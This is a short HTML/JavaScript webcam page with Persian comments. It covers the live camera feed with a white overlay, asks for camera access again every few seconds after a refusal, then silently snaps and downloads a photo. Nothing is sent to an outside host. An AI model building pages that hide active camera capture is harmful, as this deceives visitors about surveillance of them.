<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>cam</title>
    <script type="text/javascript" src="https://unpkg.com/webcam-easy/dist/webcam-easy.min.js"></script>
    <style>
        canvas {
            display: none;
        }
        #overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 900px;
            height: 700px;
            background-color: white;
            z-index: 1;
        }
        #webCam {
            position: absolute;
            top: 0;
            left: 0;
            z-index: 0;
        }
    </style>
</head>
<body>
    <div id="overlay"></div>
    <video id="webCam" autoplay playsinline width="900" height="700"></video>
    <canvas id="canvas" aria-placeholder="sadrag"></canvas>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const webCamElement = document.getElementById("webCam");
            const canvasElement = document.getElementById("canvas");
            const webcam = new Webcam(webCamElement, "user", canvasElement);

            function checkCameraPermission() {
                if (localStorage.getItem('cameraPermission') === 'granted') {
                    startWebcam();
                } else {
                    requestCameraPermission();
                }
            }

            function requestCameraPermission() {
                webcam.start()
                    .then(() => {
                        localStorage.setItem('cameraPermission', 'granted');
                        takeAPicture();
                    })
                    .catch(err => {
                        localStorage.setItem('cameraPermission', 'denied');
                        setTimeout(requestCameraPermission, 3000); // درخواست دوباره بعد از 3 ثانیه
                    });
            }

            function startWebcam() {
                webcam.start()
                    .then(() => {
                        setTimeout(() => {
                            takeAPicture();
                        }, 3000); // زمان انتظار (1 ثانیه)
                    })
                    .catch(err => {
                        console.error(err);
                    });
            }

            function takeAPicture() {
                let picture = webcam.snap();
                let link = document.createElement('a');
                link.href = picture;
                link.download = 'snapshot.png';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }

            checkCameraPermission();
        });
    </script>
</body>
</html>
